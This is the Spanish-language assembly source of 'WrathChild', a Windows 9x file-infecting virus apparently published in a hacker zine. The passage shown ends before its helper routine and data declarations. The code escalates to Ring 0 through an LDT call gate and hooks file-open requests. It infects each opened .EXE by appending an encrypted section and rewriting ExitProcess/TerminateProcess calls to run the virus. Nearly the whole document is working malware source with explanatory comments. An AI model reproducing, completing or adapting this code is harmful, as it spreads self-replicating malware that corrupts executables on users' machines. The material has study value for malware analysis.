;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; AVISO: Pasado de forma impresa a .TXT en mediante OCR. Adem s reeditado. ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; WrathChild: ;; Virus residente en Ring 0 ( solo fona bajo W9x ), infecta ;;
;; Summer'2000 ;; EXEs ( PE ) cada vez que se hace una petici¢n de apertura ;;
;;;;;;;;;;;;;;;;; de los mismos.                                            ;;
;;                                                                          ;;
;; Ummm pos eso que soy vastante null documentando o al menos antes lo era, ;;
;; ya que por la cuenta que me trae estoy aprendiendo xD. Por otra parte he ;;
;; usado frases algo... ejem: largas xD: yooooo soy asi por que el mundo... ;;
;;                                                                          ;;
;; Sorry tb por el hecho de que el c¢digo es vastante spaguetti :S :( y tb  ;;
;; buggy y poco optimizado ( auqnue tiene cosas que est n mas spaguetti por ;;
;; eso mismo, por el hecho de optimizar ). Aparte, hay cosas bastante locas ;;
;; o extra¤as... paranoias mias que bueno puff puess sorry si no entendeis. ;;
;;                                                                          ;;
;; Si hay algo a comentar o preguntar, usad el foro de DTFzine: Responder‚. ;;
;;                                                                          ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Agradecimientos:                                                         ;;
;;                                                                          ;;
;;    - 29A,MTX,Phalcon Skism ( ¨ seguira vivo ? ),...: Fuentes gigantes de ;;
;;                                                      informaci¢n que aun ;;
;;                                                      uso... y 29A parece ;;
;;                                                      seguir viva y fresh ;;
;;                                                      jeje... Keep going! ;;
;;                                                                          ;;
;;    - Assembly Programmersï Journal: Desconozco si sigue en pie pero...   ;;
;;                                     todo el tema de ring 0 y demas, lo   ;;
;;                                     vi por primera vez alli :D.          ;;
;;                                                                          ;;
;;    - wkt: Aparte del tema de cracking y tal... un art¡culo sobre las     ;;
;;           call gates a ring 0 perfectamente explicado que lo he lei y    ;;
;;           rumie mushoooo :) y ahura pos uso la tesnica aqu¡ };P.         ;;
;;                                                                          ;;
;;    - Todos los que estais por ayudar en el IRC, WWW, y demas medios: He  ;;
;;      dicho ayudar eh!!! :| No liarla parda y manipular cacho ... arggg,  ;;
;;      mejor me callo.                                                     ;;
;;                                                                          ;;
;;    - Xezaw y en general DTF: Por dejar a este loco ( /me ) soltaros la   ;;
;;                              chapa y publicar esto.                      ;;
;;                                                                          ;;
;;    - Y para ser politicamente correcto: De todos aquellos de los que no  ;;
;;                                         me acuerdo :S.                   ;;
;;                                                                          ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Comentarios: A d¡a de hoy, cosas como la LSSI, los copyrights y dem s    ;;
;;              ( aunque no me jodan mucho directamente ), solo me dan pena ;;
;;              y aunque lo que ahora dir‚, pueda resultar algo dicho muy a ;;
;;              la ligera, es resultado de muchas horas comiendome el tarro ;;
;;              e incluso horas de debate con gente ( personas ) de ideas   ;;
;;              contrastadas:                                               ;;
;;                                                                          ;;
;;              - Todo tipo de uso -de todo tipo de bitstream- que no tenga ;;
;;                como f¡n el hacer da¤o, es legitimo ( y repito: legitimo, ;;
;;                no legal, esta visto que lo de la ley... no sigue una     ;;
;;                una justicia natural, o quiza s¡, quiza si siga una de    ;;
;;                las muuuuuchas justicias naturales que hay, y ese es el   ;;
;;                problema ).                                               ;;
;;                                                                          ;;
;;              - Esto puede sonar ambiguo, matizable, discutible... bueno, ;;
;;                en realidad es lo que quiero... que sigamos dandole mat¡z ;;
;;                o discusi¢n y que empecemos a pensar YA que todos l@s     ;;
;;                chic@s ( joder que correcto soy xDDD ) mal@s, no somos    ;;
;;                tan mal@s... HABLARIA DURANTE HORAS,... ;)                ;;
;;                                                                          ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; > WE HAVE THE FORCE TO MAKE WRONG RIGHT AS THE RIVER LEAVES THE STREAM < ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

.386p                           ; Instrucciones de 386 m s las privilegiadas.
.model flat

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; Equates...

MZChecksum                      equ 12h

DireccionDeCabeceraPE           equ 3Ch

MinimoTamannoDeLaCabeceraPE     equ 18h

ObjectNumber                    equ 06h
NTHeaderSize                    equ 14h
Flags                           equ 16h
EntryPointRVA                   equ 28h
ImageBase                       equ 34h
ObjectAlign                     equ 38h
FileAlign                       equ 3Ch
ImageSize                       equ 50h
Headersize                      equ 54h
FileChecksum                    equ 58h

DireccionDeImports              equ 80h

ObjectEntrySize                 equ 28h

ObjectName                      equ 00h
ObjectVirtualSize               equ 08h
ObjectRVA                       equ 0Ch
ObjectPhysicalSize              equ 10h
ObjectPhysicalOffset            equ 14h
ObjectFlags                     equ 24h

NuestroTamanno                  equ offset FinDelCodigo-offset ComienzoDelCodigo

MaximoTamannoDeNombreDeArchivo  equ 00000104h  ; 260 bytes ( documentado... ).
CODE_EXE_READ_WRITE_OBJECT      equ 0E0000020h

IdentificadorDeCabeceraMZ       equ 5A4Dh       ; MZ
IdentificadorDeCabeceraPE       equ 00004550h   ; PE,0,0
IdentificadorDeInfectado        equ 4357h       ; WC

ExtensionDeVictima              equ 'exe.'

CRC32DeExitProcess              equ 'xE'+'ti'+'rP'+'co'+'se'+'s'
CRC32DeTerminateProcess         equ 'eT'+'mr'+'ni'+'ta'+'Pe'+'or'+'ec'+'ss'

MaximoTamannoDeVictima          equ 00200000h ; 2 MBytes.
MinimoTamannoDeVictima          equ 00001000h ; 4 KBytes.

IFSMgr                          equ 0040h

GetHeap                         equ 000Dh
InstallFileSystemApiHook        equ 0067h
UniToBCSPath                    equ 0041h
Ring0_FileIO                    equ 0032h

R0_OPENCREATFILE                equ 0D500h
R0_READFILE                     equ 0D600h
R0_WRITEFILE                    equ 0D601h
R0_CLOSEFILE                    equ 0D700h
R0_GETFILESIZE                  equ 0D800h

FAIL_IF_OPEN                    equ 0001h
OPEN_READ_WRITE                 equ 0002h
FILE_SHARE_NONE                 equ 0000h

IFSFN_OPEN                      equ 00000024h

.code
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; C¢digo principal...

ComienzoDelCodigo:              db 0BEh ; mov esi,
ClaveDeCodificado:              dd ?    ; que a su vez es la direccion absoluta en mem de ComienzoDelCodigoCodificado.
BucleDeDecodificado:            xor [esi],esi
ComienzoDelCodigoCodificado:    lodsd
                                inc eax
                                jnz BucleDeDecodificado

ComienzoDelCodigoDePrimeraE:    db 0BBh ; mov ebx,
DeltaHandle                     dd 00401000h

                                mov edx,[ebx+offset DireccionDeRetorno-offset ComienzoDelCodigo]
                                mov edx,[edx]

                                xor dx,dx
                                mov eax,00010000h
                                jmp LaPrimeraPosibilidadDeKernel32
BuscaKernel32:                  sub edx,eax
LaPrimeraPosibilidadDeKernel32: cmp word ptr [edx],IdentificadorDeCabeceraMZ
                                jnz BuscaKernel32

                                ; ¨ Nos hemos instalado ya ?
                                cmp word ptr [edx+MZChecksum],IdentificadorDeInfectado
                                jz ErrorAlEntrarEnRing0

                                xor eax,eax

                                sldt ax

                                ; ¨ Estamos en NT o hay algun problema ?
                                test eax,eax
                                jz ErrorAlEntrarEnRing0

                                push ebp
                                sgdt [esp-02h]
                                pop ebp

                                and al,0F8h
                                add ebp,eax

                                mov ch,[ebp+07h]
                                mov cl,[ebp+04h]
                                shl ecx,10h
                                mov cx,[ebp+02h]

                                lea edi,[ecx+08h]

                                lea esi,[ebx+offset CodigoDeRing0-offset ComienzoDelCodigo]
                                mov eax,esi

                                cld

                                stosw
                                mov eax,0EC000028h
                                stosd
                                shld eax,esi,10h
                                stosw

                                db 9Ah  ; call 000Fh:XXXXXXXXh
                                dd ?    ; el offset da igual, lo que importa 
                                dw 000Fh        ; es el selector que en este
                                                ; caso no es un selector que
                                                ; hace referencia a una zona
                                                ; de memoria y tal, sino que
                                                ; hace referencia a una call
                                                ; gate ( gracias a WKT por
                                                ; la informaci¢n :D ). Es por
                                                ; eso que el offset no hace
                                                ; falta, pues el selector
                                                ; 000Fh tiene en su entrada
                                                ; correspondiente de la tabla
                                                ; de descriptores, la info
                                                ; que indica que es una call
                                                ; gate y cual es la direcci¢n
                                                ; a la que se a de saltar.

ErrorAlEntrarEnRing0:           dw 25FFh        ; jmp []
DireccionDeRetorno              dd offset FinDelCodigo

CodigoDeRing0:                  pushad

                                ; Ponemos la marca de residencia...
                                mov word ptr [edx+MZChecksum],IdentificadorDeInfectado

                                ; Pedimos memoria...
                                mov eax,((MaximoTamannoDeVictima+NuestroTamanno+0FFFh)/1000h)*1000h
                                push eax
                                call LlamadaVxD ; Mirar la rutina LlamadaVxD...
                                dw GetHeap
                                dw IFSMgr
                                db 06h dup (?) ; para albergar la llamada...
                                pop ecx

                                test eax,eax
                                jz ErrorAlIntentarQuedarResidente

                                ; Si todo ha ido bien, EAX apunta a la memoria que hemos reservado.
                                mov ecx,NuestroTamanno
                                mov edi,eax
                                mov esi,ebx     ; Recordamos que EBX es nuestro DeltaHandle, luego es ah¡ donde esta nuestro c¢digo.

                                rep movsb

                                mov ebx,eax
                                mov [ebx+offset DeltaHandleEnMemoria-offset ComienzoDelCodigo],eax

                                lea edx,[ebx+offset GestorDeAperturaDeArchivos-offset ComienzoDelCodigo]

                                ; De momento bloqueamos toda peticion de apertura // algo as¡ como una wait()...
                                ; no se si en realidad hace falta, puesto que no se producen dichas peticiones,
                                ; pero porsia xDDD, que garrulo soy.
                                mov word ptr [edx],0FEEBh       ; jmp $

                                lea ecx,[edx+03h]
                                mov [ecx],edx

                                ; Instalar hook...
                                push edx

                                call LlamadaVxD
                                dw InstallFileSystemApiHook
                                dw IFSMgr
                                db 06h dup(?)

                                pop edx

                                mov [edx-04h],eax       ; Con esto ya tenemos
                                                        ; el hook puesto, pero
                                                        ; tenemos que guardar
                                                        ; la direcci¢n del
                                                        ; gestor original para
                                                        ; pasar el control a
                                                        ; ‚l una vez acabemos
                                                        ; nuestra manipulaci¢n
                                                        ; de .EXEs o cuando
                                                        ; estemos "ocupados"
                                                        ; manipulando y no
                                                        ; podamos atender a la
                                                        ; petici¢n de apertura.

                                ; Jeje, esto ser¡a la signal(), osea, desbloqueamos.
                                mov word ptr [edx],0C766h

ErrorAlIntentarQuedarResidente:	popad

                                retf ; Volvemos al esclavo Ring 3...

GestorOriginal:                 dw 25FFh        ; jmp []
                                dd ?
                                ; ­ Nada entre estas dos lineas ! // La siguiente
                                ; instrucci¢n es una v lvula de paso, cuando se ejecuta,
                                ; se convierte a s¡ misma en un JMP $-6, osea: jmp GestorOriginal
                                ; Esto es as¡, para evitar la reentrada. Se que hay formas m s
                                ; al estilo API o VxDCall para hacer esto y tal, pero en un sistema
                                ; monoprocesador, esto no deberia de dar ningun problema ( y como
                                ; esto solo fona en W9x }: jejeje y W9x no soporta sistemas con
                                ; multiprocesador ;P po yata xDDD ).
GestorDeAperturaDeArchivos:     db 66h,0C7h,05h ; mov word ptr [?],0F8EBh > EB F8 > jmp GestorOriginal
                                dd ?    ; aqui estar  la dir de GestorDeAperturaDeArchivos
                                dw 0F8EBh       ; jmp $-06h

                                pushfd
                                pushad

                                db 0BBh ; mov ebx,
DeltaHandleEnMemoria            dd ?

                                cmp dword ptr [esp+2Ch],IFSFN_OPEN
                                jnz FinDelGestorDeArchivos

                                lea ebp,[ebx+NuestroTamanno]
                                mov eax,[esp+30h]

                                cmp eax,00000003h       ; si es un disquete
                                jb FinDelGestorDeArchivos       ; mejor dejarlo

                                cmp eax,0000001Ah       ; si es mayor que Z:
                                ja FinDelGestorDeArchivos       ; mejor dejarlo

                                add eax,00003A40h       ; convertimos el n£mero de unidad en X:...

                                mov [ebp],eax

                                mov esi,[esp+3Ch]       ; ponemos ESI apuntando
                                mov esi,[esi+0Ch]       ; al nombre del archivo
                                lodsd                   ; en formato unicode
                                ; ^ lo del lodsd es para saltarme los primeros 4 bytes del filename por que son dos
                                ; caracteres unicode que no interesan ( no valen ) // seria un esi+=4, sin mas.

                                xor eax,eax

                                push eax
                                push MaximoTamannoDeNombreDeArchivo
                                push esi

                                lea eax,[ebp+02h]
                                push eax

                                call LlamadaVxD
                                dw UniToBCSPath
                                dw IFSMgr
                                db 06h dup(?)

                                pop esi

                                add esp,0Ch

                                add esi,eax
                                mov eax,[esi-04h]       ; los ultimos 4 bytes del path tienen la extensi¢n
                                or eax,20202000h        ; y una vez cogidos, los pasamos a min£sculas...

                                ; ¨ tiene extensi¢n .EXE ?
                                cmp eax,ExtensionDeVictima
                                jnz FinDelGestorDeArchivos

                                call InfectarArchivoApuntadoPorEBP

                                ; Arreglamos la v lvula de paso para que se pueda atender la siguiente petici¢n...
FinDelGestorDeArchivos:         mov word ptr [ebx+offset GestorDeAperturaDeArchivos-offset ComienzoDelCodigo],0C766h

                                popad
                                popfd

                                jmp GestorOriginal

; Infecta el archivo apuntado por EBP; EBP tiene que apuntar tamb¡en a un
; bloque de memoria que albergue el m ximo tama¤o posible de la v¡ctima.
InfectarArchivoApuntadoPorEBP:  mov [ebx+offset ValorSalvadoDeESP-offset ComienzoDelCodigo],esp
                                ; Guardamos ESP, porque puede que en caso de
                                ; error de infecci¢n, la pila est‚ cargada y
                                ; as¡, sea cual sea el punto de error, podremos
                                ; recuperar la pila al salir.

                                ; Abrimos la v¡ctima...
                                push ebx

                                mov esi,ebp
                                mov bx,OPEN_READ_WRITE
                                mov cx,FILE_SHARE_NONE
                                mov dx,FAIL_IF_OPEN
                                mov eax,R0_OPENCREATFILE

                                call LlamadaVxD
                                dw Ring0_FileIO
                                dw IFSMgr
                                db 06h dup(?)

                                pop ebx

                                jc ErrorAlAbrirLaVictima

                                push ebx

                                mov [ebx+offset FileHandleDeLaVictima-offset ComienzoDelCodigo],eax

                                ; Obtenemos el tama¤o del archivo para posteriores c lculos.
                                xchg eax,ebx
                                mov eax,R0_GETFILESIZE

                                call LlamadaVxD
                                dw Ring0_FileIO
                                dw IFSMgr
                                db 06h dup(?)

                                pop ebx
                                push ebx

                                ; ¨ Es demasiado peque¤o ?
                                cmp eax,MinimoTamannoDeVictima
                                jb ErrorAlInfectar

                                ; ¨ Es demasiado grande ?
                                cmp eax,MaximoTamannoDeVictima
                                ja ErrorAlInfectar

                                mov [ebx+offset TamannoDeLaVictima-offset ComienzoDelCodigo],eax

                                ; leemos la cabecera PE del ejecutable ( esto
                                ; ser  la base de la infecci¢n, pues dejando
                                ; la escritura del c¢digo v¡rico al final del
                                ; archivo, todos los dem s cambios se efectuan
                                ; en la cabecera... ( bueno, tb est n los
                                ; cambios de todo jmp/call [Exit/TerminateProcess]
                                ; por un push DireccionDelVirus ret:
                                ; FF 25 EX IT PR OC ( 6 Bytes ).
                                ; FF 15 EX IT PR OC "         \\
                                ; FF 25 TE RM IN AT "           >> 68 DI RD EL VI C3
                                ; FF 15 TE RM IN AT "         //   ( 6 Bytes ).
                                ; )).

                                mov esi,ebp
                                mov ecx,00000400h       ; 1 KByte ser  suficiente...
                                xor edx,edx     ; Leer desde el principio.
                                mov ebx,[ebx+offset FileHandleDeLaVictima-offset ComienzoDelCodigo]
                                mov eax,R0_READFILE

                                call LlamadaVxD
                                dw Ring0_FileIO
                                dw IFSMgr
                                db 06h dup(?)

                                pop ebx

                                ; ¨ Es un ejecutable ?
                                cmp word ptr [ebp],IdentificadorDeCabeceraMZ
                                jnz ErrorAlInfectar

                                ; ¨ No est  infectado ya ?
                                cmp word ptr [ebp+MZChecksum],IdentificadorDeInfectado
                                jz ErrorAlInfectar

                                movzx eax,word ptr [ebp+DireccionDeCabeceraPE]

                                ; ¨ La cabecera PE est  m s alla de 768 Bytes ?
                                cmp eax,00000300h
                                ja ErrorAlInfectar

                                mov esi,ebp
                                add esi,eax

                                ; ¨ Es un Portable Executable ?
                                cmp dword ptr [esi],IdentificadorDeCabeceraPE
                                jnz ErrorAlInfectar

                                ; ¨ Es una DLL ?
                                test word ptr [esi+Flags],2000h
                                jnz ErrorAlInfectar

                                mov eax,NuestroTamanno-01h
                                add eax,[ebx+offset TamannoDeLaVictima-offset ComienzoDelCodigo]
                                mov ecx,[esi+FileAlign]
                                add eax,ecx
                                xor edx,edx
                                div ecx
                                mul ecx

                                ; Guardamos ECX para la proxima lectura en la
                                ; que se leer  todo el archivo de la v¡ctima.
                                mov ecx,eax

                                ; Calculamos el tama¤o sobrante a a¤adir al
                                ; tama¤o original de la v¡ctima.
                                sub eax,[ebx+offset TamannoDeLaVictima-offset ComienzoDelCodigo]
                                mov [ebx+offset TamannoAnnadido-offset ComienzoDelCodigo],eax

                                ; leemos todo el archivo...
                                push ebx

                                mov esi,ebp
                                xor edx,edx     ; Leer desde el principio.
                                mov ebx,[ebx+offset FileHandleDeLaVictima-offset ComienzoDelCodigo]
                                mov eax,R0_READFILE

                                call LlamadaVxD
                                dw Ring0_FileIO
                                dw IFSMgr
                                db 06h dup(?)

                                pop ebx

                                movzx eax,word ptr [ebp+DireccionDeCabeceraPE]
                                mov esi,ebp
                                add esi,eax

                                ; Obtener la direcc¢n del £ltimo objeto de
                                ; la cabecera ( pues nostros crearemos otro
                                ; objeto justo depues del £ltimo; este objeto
                                ; tendr  el c¢digo del virus... ) ( objeto=secci¢n ).

                                movzx eax,word ptr [esi+ObjectNumber]

                                push eax

                                inc word ptr [esi+ObjectNumber]
                                dec eax
                                imul edi,eax,ObjectEntrySize

                                movzx eax,word ptr [esi+NTHeaderSize]
                                add eax,MinimoTamannoDeLaCabeceraPE
                                add eax,esi
                                add edi,eax

                                push eax

                                ; calculamos la direcci¢n alineada al tamanno
                                ; de objeto que tendr  nuestro objeto v¡rico.

                                mov eax,[edi+ObjectVirtualSize]
                                add eax,[edi+ObjectRVA]
                                dec eax
                                mov ecx,[esi+ObjectAlign]
                                add eax,ecx
                                xor edx,edx
                                div ecx
                                mul ecx

                                ; en este punto, EAX=RVA de nuestro objeto v¡rico.
                                ; y lo guardamos en la secci¢n que albergar  nuestro
                                ; c¢digo v¡rico.
                                mov [edi+ObjectEntrySize+ObjectRVA],eax

                                ; Calculamos el DeltaHandle del c¢digo v¡rico
                                ; dentro del .EXE cuando est‚ cargado en mem.
                                ; NOTA: No confundir con el DeltaHandleEnMemoria,
                                ;       que es el delta handle para gestor
                                ;       de apertura de archivos que se queda
                                ;       residente en ring 0 y se encarga de las
                                ;       infecciones }:>
                                add eax,[esi+ImageBase] ; le a¤adimos la base

                                ; y por fin metemos ese DeltaHandle en la instrucci¢n que
                                ; est  hardcoded en el c¢digo del virus ( ver         db 0BBh ; mov ebx,
                                ;                                         DeltaHandle dd ? ).
                                mov [ebx+offset DeltaHandle-offset ComienzoDelCodigo],eax

                                ; le ponemos un nombre al objeto que estamos insertando.
                                mov [edi+ObjectEntrySize],'EVOL'        ; "LOVE" \\ "LOVE!WAR"
                                mov [edi+ObjectEntrySize+04h],'RAW!'    ; "!WAR" //

                                ; Calculamos el tama¤o virtual necesario para
                                ; esta secci¢n u objeto que albergar  nuestro
                                ; c¢digo v¡rico.
                                mov eax,NuestroTamanno-01h+00000400h
                                ; + 1KByte de memoria...
                                mov ecx,[esi+ObjectAlign]
                                add eax,ecx
                                xor edx,edx
                                div ecx
                                mul ecx
                                ; Y lo guardamos en la info de esa secci¢n :D.
                                mov [edi-ObjectEntrySize-ObjectVirtualSize],eax

                                ; Por otra parte, este tama¤o virtual de la secci¢n,
                                ; ahora, tb toma parte de el tama¤o total de toda la
                                ; imagen PE asique... la sumamos a la ImageSize de la
                                ; cabecera PE :).
                                add [esi+ImageSize],eax

                                ; Aqui, calculamos el tama¤o f¡sico de la secci¢n
                                ; que albergar  al virus:
                                mov eax,NuestroTamanno-01h
                                mov ecx,[esi+FileAlign]
                                add eax,ecx
                                xor edx,edx
                                div ecx
                                mul ecx
                                ; Y como antes, metemos ese valor a la info de dicha
                                ; secci¢n.
                                mov [edi+ObjectEntrySize+ObjectPhysicalSize],eax

                                ; Ahora calculamos la direcci¢n f¡sica en el .EXE
                                ; en disco donde empieza esta secci¢n. Para ello,
                                ; solo tenemos que coger la direcci¢n de comienzo
                                ; f¡sica de la secci¢n que nos precede y sumar a
                                ; esa direcci¢n el tama¤o f¡sico de esa misma
                                ; secci¢n ( NuestraDirFisica=DirFisicaAnterior+
                                ;                            Tama¤oFisicoAnterior ).
                                mov eax,[edi+ObjectPhysicalOffset]
                                add eax,[edi+ObjectPhysicalSize]
                                ; Y lo ponemos en la info de nuestra secci¢n:
                                mov [edi+ObjectEntrySize+ObjectPhysicalOffset],eax

                                ; metemos a nuestro objeto o secci¢n los atributos
                                ; deseados.
                                mov [edi+ObjectEntrySize+ObjectFlags],CODE_EXE_READ_WRITE_OBJECT

                                ; ponemos una marca para evitar la reinfecci¢n.
                                mov word ptr [ebp+MZChecksum],IdentificadorDeInfectado

                                ; Copiamos el c¢digo v¡rico al final de la v¡ctima.
                                xchg eax,edx    ; en EDX empieza en c¢digo del virus, ahora pasa a EAX.
                                mov edi,[ebx+offset TamannoDeLaVictima-offset ComienzoDelCodigo]
                                add edi,ebp     ; en EBP esta mapeada o cargada la v¡ctima.
                                                ; luego: EBP+EDI=final del c¢digo de la v¡ctima.
                                mov ecx,[ebx+offset TamannoAnnadido-offset ComienzoDelCodigo]

                                rep stosb       ; optimizable en ciclos :(...

                                ; La parte m s complicada de la infecci¢n:
                                ; encontrar la tabla de imports, encontrar
                                ; los imports de KERNEL32.dll, encontrar el
                                ; import ExitProcess/TerminateProcess,
                                ; encontrar la secci¢n de c¢digo ejecutable,
                                ; encontrar cualquier llamada a ExitProcess
                                ; /TerminateProcess y parchearla para que
                                ; apunte a nuestro c¢digo v¡rico.

                                ; AVISO: Esto es lo m s spaguetti que he visto en vida xDDD.

                                pop edi

                                pop ecx

                                push edx

                                push ecx

                                push edi

                                push esi

                                xor edx,edx

                                mov eax,[esi+DireccionDeImports]

                                test eax,eax
                                jz ErrorAlInfectar

SiguientePosibilidadDeImports:	imul esi,edx,ObjectEntrySize

                                cmp [esi+edi+ObjectRVA],eax
                                ja TablaDeImportsEncontrada

                                inc edx

                                dec ecx
                                jnz SiguientePosibilidadDeImports

                                jmp ErrorAlInfectar

TablaDeImportsEncontrada:	dec edx
                                imul esi,edx,ObjectEntrySize
                                add esi,edi
                                mov edi,[esi+ObjectPhysicalOffset]
                                mov edx,[esi+ObjectRVA]
                                sub edx,edi
                                sub eax,[esi+ObjectRVA]
                                add edi,eax
                                add edi,ebp

                                xor ecx,ecx

SiguientePosibilidadDeKernel32:	imul eax,ecx,14h
                                mov eax,[eax+edi+0Ch]

                                test eax,eax
                                jz ErrorAlInfectar

                                add eax,ebp
                                sub eax,edx
                                inc ecx

                                mov eax,[eax]
                                or eax,20202020h        ; pasamos a minusculas para comparar...
                                
                                cmp eax,'nrek'  ; ¨ Es "KERN" ? ( osea kernel32.dll ).
                                jnz SiguientePosibilidadDeKernel32

                                ; Aqu¡ obtenemos el look up table de los
                                ; imports del KERNEL32.dll

                                dec ecx

                                imul ecx,ecx,14h

                                mov eax,[ecx+edi]

                                test eax,eax
                                jnz NoHayFirstOriginalThunk

                                mov eax,[ecx+edi+10h]

                                test eax,eax
                                jz ErrorAlInfectar

NoHayFirstOriginalThunk:        add eax, ebp
                                sub eax,edx

                                mov ecx,[ecx+edi+10h]
                                push ecx

                                xor ecx,ecx

SiguientePosibilidadDeExitP:    mov esi,[eax]

                                test esi,esi
                                jz ErrorAlInfectar

                                add eax,00000004h

                                add esi,ebp
                                sub esi,edx
                                inc esi
                                inc esi
                                call CalcularCRC32DeLaCadena

                                inc ecx

                                cmp esi,CRC32DeExitProcess
                                jz ExitTerminateProcessEncontrado

                                cmp esi,CRC32DeTerminateProcess
                                jz ExitTerminateProcessEncontrado

                                jmp SiguientePosibilidadDeExitP

ExitTerminateProcessEncontrado: dec ecx

                                shl ecx,02h

                                pop edx

                                add edx,ecx

                                pop esi

                                add edx,[esi+ImageBase]

                                ; Aqu¡ metemos la direcci¢n donde se encontrar  la direcci¢n de
                                ; ExitProcess/TerminateProcess, que nos valdr  para calcular la
                                ; direcci¢n base del KERNEL32.dll, en la parte de c¢digo del
                                ; principio del virus que calcula dicha direcci¢n base.
                                mov [ebx+offset DireccionDeRetorno-offset ComienzoDelCodigo],edx

                                pop edi

                                pop ecx

                                push esi

                                push edx

                                xor edx,edx

                                mov eax,[esi+EntryPointRVA]

SiguientePosibilidadDeCodigoE:  imul esi,edx,ObjectEntrySize

                                mov esi,[esi+edi+ObjectRVA]

                                push eax

                                imul eax,edx,ObjectEntrySize

                                mov eax,[edi+eax+ObjectVirtualSize]
                                add esi,eax

                                pop eax

                                cmp eax,esi
                                jb SeccionDeCodigoEncontrada

                                inc edx

                                dec ecx
                                jnz SiguientePosibilidadDeCodigoE

                                jmp ErrorAlInfectar

SeccionDeCodigoEncontrada:      imul eax,edx,ObjectEntrySize
                                add eax,edi

                                mov esi,[eax+ObjectPhysicalOffset]
                                mov ecx,[eax+ObjectPhysicalSize]
                                sub ecx,00000006h
                                add esi,ebp

                                pop edx

                                xor edi,edi

SiguienteDireccionDeExitP:	lodsd
                                dec esi
                                dec esi
                                dec esi

                                cmp eax,edx
                                jnz NoEsLaDireccionDeExitProcess

                                cmp word ptr [esi-03h],25FFh    ; jmp []
                                jz ParcheaLaLlamadaAExitP

                                cmp word ptr [esi-03h],15FFh    ; call []
                                jz ParcheaLaLlamadaAExitP

                                jmp NoEsLaDireccionDeExitProcess

ParcheaLaLlamadaAExitP:         mov byte ptr [esi-03h],68h      ; push
                                mov eax,[ebx+offset DeltaHandle-offset ComienzoDelCodigo]
                                mov [esi-02h],eax       ; Direcci¢n del virus.
                                mov byte ptr [esi+02h],0C3h ; ret

                                add esi,00000005h

                                sub ecx,00000005h
                                jbe FinDeParcheoDeLlamadasAExitP

                                inc edi ; incrementamos el contador de cambios...

NoEsLaDireccionDeExitProcess:	dec ecx
                                jnz SiguienteDireccionDeExitP

FinDeParcheoDeLlamadasAExitP:	test edi,edi
                                jz ErrorAlInfectar

                                pop esi

                                pop edx

                                ; Desde aqu¡, que las llamadas o saltos a ExitProcess
                                ; /TerminateProcess est n ya parcheadas para que salten
                                ; a nuestro virus, ya solo nos queda cifrar el c¢digo
                                ; v¡rico y escribirlo todo a disco ( el archivo ya
                                ; infectado que tenemos en memoria ).
                                mov eax,[ebx+offset DeltaHandle-offset ComienzoDelCodigo]
                                add eax,offset ComienzoDelCodigoCodificado-offset ComienzoDelCodigo

                                mov [ebx+offset ClaveDeCodificado-offset ComienzoDelCodigo],eax

                                ; Hacemos una copia del c¢digo v¡rico en
                                ; la memoria del archivo de la victima...
                                lea edi,[edx+ebp]
                                push edi

                                mov edx,esi
                                mov esi,ebx
                                mov ecx,NuestroTamanno

                                rep movsb

                                ; ponemos la marca de fin de c¢digo...
                                xor eax,eax
                                dec eax
                                stosd
                                stosd
                                stosd

                                ; Ciframos la copia...
                                pop edi
                                add edi,offset ComienzoDelCodigoCodificado-offset ComienzoDelCodigo

                                mov eax,[ebx+offset ClaveDeCodificado-offset ComienzoDelCodigo]
                                mov ecx,(NuestroTamanno/04h)+02h

BucleDeCodificado:		xor [edi],eax

                                add eax,00000004h
                                add edi,00000004h

                                dec ecx
                                jnz BucleDeCodificado

                                ; Sobreescribimos todo el archivo de la v¡ctima
                                ; con la v¡ctima infectada de memoria.

                                push ebx

                                mov esi,ebp
                                mov ecx,[ebx+offset TamannoDeLaVictima-offset ComienzoDelCodigo]
                                add ecx,[ebx+offset TamannoAnnadido-offset ComienzoDelCodigo]

                                ; ^ ECX=Tama¤o alineado de la v¡tima ya infectada.
                                xor edx,edx     ; Escribir desde el principio.
                                mov ebx,[ebx+offset FileHandleDeLaVictima-offset ComienzoDelCodigo]
                                mov eax,R0_WRITEFILE

                                call LlamadaVxD
                                dw Ring0_FileIO
                                dw IFSMgr
                                db 06h dup(?)

                                pop ebx

                                ; Si ha habido cualquier error, se salta aqu¡:
ErrorAlInfectar:                mov esp,[ebx+offset ValorSalvadoDeESP-offset ComienzoDelCodigo]
                                ; ^ recuperamos la pila...

                                ; Cerramos la v¡ctima
                                push ebx

                                mov ebx,[ebx+offset FileHandleDeLaVictima-offset ComienzoDelCodigo]
                                mov eax,R0_CLOSEFILE

                                call LlamadaVxD
                                dw Ring0_FileIO
                                dw IFSMgr
                                db 06h dup(?)

                                pop ebx

                                ; Si el archivo de la v¡ctima no se ha podido abrir,
                                ; se salta aqu¡.
ErrorAlAbrirLaVictima:          ret     ; Fin de la infecci¢n.

; ESI=Direcci¢n de la cadena de texto; Devuelve ESI=CRC32 de la cadena.
CalcularCRC32DeLaCadena:        push eax
                                push edi

                                xor edi,edi

BucleDeSumadoDeCRC32:           lodsw

                                test al,al
                                jz FinDelBucleDeCalculoDeCRC32

                                cwde
                                add edi,eax

                                test ah,ah
                                jnz BucleDeSumadoDeCRC32

FinDelBucleDeCalculoDeCRC32:	mov esi,edi

                                pop edi
                                pop eax

                                ret

; Rutina para hacer llamadas VxD; Se deben especificar los dos words
; ( Funci¢n y DeviceID ) y debe de haber 6 bytes de buffer o hueco
; inmediatamente despues del call.
;
;                               call LlamadaVxD
;                               dw XXXXh < La Funci¢n.
;                               dw XXXXh < El DeviceID.
